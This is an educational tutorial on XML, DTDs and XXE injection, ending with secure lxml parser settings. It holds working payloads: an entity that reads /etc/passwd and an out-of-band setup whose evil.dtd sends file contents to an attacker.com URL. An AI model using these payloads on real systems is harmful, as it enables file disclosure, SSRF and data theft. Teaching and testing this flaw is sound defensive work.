# XML & XXE (XML External Entity) — Complete Notes

## What is XML?

XML (**eXtensible Markup Language**) is a markup language used to store and transport data.

It is similar to HTML, but unlike HTML, XML does **not** have predefined tags.

HTML has built-in tags such as:

```html
<h1>Title</h1>
<p>Paragraph</p>
```

Browsers already know what these tags mean.

In XML, you create your own tags based on your application's needs.

Example:

```xml
<?xml version="1.0" encoding="UTF-8"?>

<person>
    <name>p0nther</name>
    <job>hacker</job>
    <goal>pwn2own</goal>
    <role_model>Orange Tsai</role_model>
</person>
```

XML is simply a structured way to store data.

---

## Why Was XML Created?

Imagine 50 different companies exchanging data.

Without a standard format:

```xml
<username>john</username>
```

Another company may send:

```xml
<user>john</user>
```

And another:

```xml
<name>john</name>
```

The receiving application would not know what to expect.

XML solves the data-format problem, but we still need a way to define:

* Which tags are allowed
* Which tags are required
* What order tags must appear in
* Which attributes are valid

This is where **DTD** comes in.

---

# DTD (Document Type Definition)

DTD stands for **Document Type Definition**.

Think of it as a rulebook for XML files.

It tells the XML parser:

* Which tags are valid
* Which tags are required
* Which attributes are allowed
* How elements are structured

Example DTD:

```dtd
<!ELEMENT note (to, from, message)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT message (#PCDATA)>
```

This means:

* `<note>` must contain:

  * `<to>`
  * `<from>`
  * `<message>`

and all of them contain text data.

---

# Why Do Developers Use DTD?

Imagine many companies sending XML data.

Without validation:

```xml
<note>
    <sender>Bob</sender>
</note>
```

The application may break because it expects:

```xml
<note>
    <from>Bob</from>
</note>
```

DTD ensures:

✅ Required tags exist

✅ Unexpected tags are rejected

✅ Structure is correct

✅ Data follows agreed rules

---

# External DTD

Instead of putting all rules inside the XML file, developers often store them in a separate file.

Example:

```xml
<!DOCTYPE note SYSTEM "https://example.com/note.dtd">
```

The parser downloads:

```dtd
<!ELEMENT note (to, from, message)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT message (#PCDATA)>
<!ENTITY signature "Best regards, Engineering Team">
```

Then validates the XML against those rules.

Example XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE note SYSTEM "https://example.com/note.dtd">

<note>
    <to>Alice</to>
    <from>Bob</from>
    <message>The server is deployed. &signature;</message>
</note>
```

After entity expansion:

```xml
<message>
The server is deployed. Best regards, Engineering Team
</message>
```

---

# How XML Parsers Work

```text
[Incoming XML]
        │
        ▼
1. Fetch Phase
        │
        ├── Read DOCTYPE
        ├── Read SYSTEM URL
        └── Download DTD
        │
        ▼
2. Validation Phase
        │
        ├── Check required tags
        ├── Check structure
        └── Check attributes
        │
        ▼
3. Entity Expansion Phase
        │
        ├── Replace entities
        └── Build final XML object
        │
        ▼
[Application Logic]
```

---

# Internal DTD vs External DTD

## Internal DTD

Rules are written directly inside the XML file.

```xml
<!DOCTYPE BUGS [

<!ELEMENT BUGS (item+)>

<!ELEMENT item (name,severity)>

<!ELEMENT name (#PCDATA)>

<!ELEMENT severity (#PCDATA)>

<!ATTLIST item PRIORITY CDATA "0">

]>
```

Example:

```xml
<BUGS>

    <item PRIORITY="HIGH">
        <name>Server Side Bugs</name>
        <severity>9.2</severity>
    </item>

</BUGS>
```

---

## External DTD

Rules are stored in another file.

rules.dtd

```dtd
<!ELEMENT BUGS (item+)>
<!ELEMENT item (name,severity)>
<!ELEMENT name (#PCDATA)>
<!ELEMENT severity (#PCDATA)>
```

XML:

```xml
<!DOCTYPE BUGS SYSTEM "rules.dtd">
```

### Difference

| Internal DTD              | External DTD                      |
| ------------------------- | --------------------------------- |
| Rules inside XML          | Rules stored in another file      |
| Easier for small projects | Better for large projects         |
| Hard to maintain          | Reusable                          |
| Cannot easily share rules | Many XML files can share same DTD |

---

# XML Entities

Entities are basically variables in XML.

Instead of repeating values many times, we define them once.

---

## Internal Entity

Define:

```xml
<!ENTITY name "Abdarhman Mohamed (p0nther)">
```

Use:

```xml
<name>&name;</name>
```

Parser expands:

```xml
<name>Abdarhman Mohamed (p0nther)</name>
```

---

## External Entity

Instead of storing text directly, XML can load data from an external resource.

Example:

```xml
<!ENTITY hackMe SYSTEM "file:///etc/passwd">
```

Usage:

```xml
<data>&hackMe;</data>
```

The parser attempts to read:

```text
/etc/passwd
```

and insert its content.

This behavior is the foundation of XXE vulnerabilities.

---

# What is XXE?

XXE stands for:

**XML External Entity Injection**

It occurs when:

1. The application accepts XML.
2. External entities are enabled.
3. The parser processes attacker-controlled entities.

Example:

```xml
<?xml version="1.0"?>

<!DOCTYPE foo [

<!ENTITY xxe SYSTEM "file:///etc/passwd">

]>

<data>
    <name>&xxe;</name>
</data>
```

If vulnerable, the parser reads:

```text
/etc/passwd
```

and injects it into the XML document.

---

# When Direct Output Works

Typical file read:

```xml
<?xml version="1.0"?>

<!DOCTYPE foo [

<!ENTITY xxe SYSTEM "file:///etc/passwd">

]>

<data>
    <name>&xxe;</name>
</data>
```

Possible impact:

* Local file disclosure
* Source code disclosure
* Configuration disclosure
* Secrets leakage

---

# Blind XXE

Sometimes the application processes entities but does not display the result.

Example:

```xml
<data>
    <name>&xxe;</name>
</data>
```

The server reads the file but never shows it to us.

In this case we need another technique.

---

# Parameter Entities (%)

Normal entities:

```xml
<!ENTITY test "hello">
```

Called with:

```xml
&test;
```

Parameter entities:

```xml
<!ENTITY % test "hello">
```

Called with:

```xml
%test;
```

Parameter entities are mainly used inside DTDs.

---

# Loading External DTDs

Instead of writing everything inline:

```xml
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;
```

The parser downloads:

```text
http://attacker.com/evil.dtd
```

and executes whatever is inside it.

---

# Out-of-Band (OOB) XXE

Used when:

* File reading works
* Output is not visible

Goal:

1. Read file
2. Send content to attacker-controlled server

---

## Step 1 — Create evil.dtd

Host this file on your server:

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">

<!ENTITY % all
"<!ENTITY &#x25; send SYSTEM 'https://attacker.com/?data=%file;'>">

%all;
%send;
```

---

## Step 2 — Make Target Load It

```xml
<?xml version="1.0"?>

<!DOCTYPE data [

<!ENTITY % load_external SYSTEM "http://attacker.com/evil.dtd">

%load_external;

]>

<data>test</data>
```

Flow:

```text
Target XML Parser
        │
        ▼
Downloads evil.dtd
        │
        ▼
Reads /etc/passwd
        │
        ▼
Sends data to attacker.com
```

This technique is called:

**Out-of-Band XXE (OOB XXE)**

---

# Typical XXE Testing Methodology

## 1. Confirm Entity Expansion

```xml
<!DOCTYPE user [

<!ENTITY test "XXE_WORKS">

]>

<user>
    <name>&test;</name>
</user>
```

If you see:

```text
XXE_WORKS
```

Entity expansion is enabled.

---

## 2. Attempt File Read

```xml
<!DOCTYPE foo [

<!ENTITY xxe SYSTEM "file:///etc/passwd">

]>
```

---

## 3. Cloud Metadata Access

Historically, cloud environments exposed instance metadata services that could be queried from the server itself. Accessing such services through SSRF or XXE can reveal sensitive instance information if protections are missing.

---

## 4. Test Outbound Requests

Use your own listener:

```xml
<!DOCTYPE foo [

<!ENTITY xxe SYSTEM "http://your-server.com">

]>
```

If your server receives a request, outbound network access exists.

---

## 5. Move to OOB XXE

Load your external DTD and exfiltrate data through your controlled endpoint.

---

# XXE Impact

## File Read

```text
/etc/passwd
web.config
application secrets
source code
```

---

## SSRF

XXE can force the server to make requests to internal systems.

```text
XXE → SSRF
```

Possible targets:

```text
Internal APIs
Admin panels
Cloud services
Microservices
```

---

## RCE

In some rare cases:

```text
XXE → SSRF → Internal Service Abuse → RCE
```

or

```text
XXE → Dangerous Parser Feature → RCE
```

The exact path depends on the target environment.

---

# Vulnerable Python Example

```python
parser = etree.XMLParser(
    resolve_entities=True,
    no_network=False
)
```

Problems:

```python
resolve_entities=True
```

Allows entity expansion.

```python
no_network=False
```

Allows external resource fetching.

This configuration may permit XXE attacks.

---

# Secure Python Example

```python
parser = etree.XMLParser(
    resolve_entities=False,
    load_dtd=False,
    no_network=True
)
```

Why?

```python
resolve_entities=False
```

Prevents entity expansion.

```python
load_dtd=False
```

Blocks external DTD loading.

```python
no_network=True
```

Blocks network access from parser.

Together they significantly reduce XXE risk.

---

# Quick Summary

XML:

* Used to store and transport structured data.
* Allows custom tags.

DTD:

* Defines XML rules.
* Can be internal or external.

Entities:

* XML variables.
* Can contain text or external resources.

XXE:

* Occurs when external entities are processed.
* Can lead to:

  * File disclosure
  * SSRF
  * Blind data exfiltration
  * Sometimes further compromise depending on environment

Defenses:

* Disable entity expansion.
* Disable DTD loading.
* Disable parser network access.
* Use secure XML parser configurations.
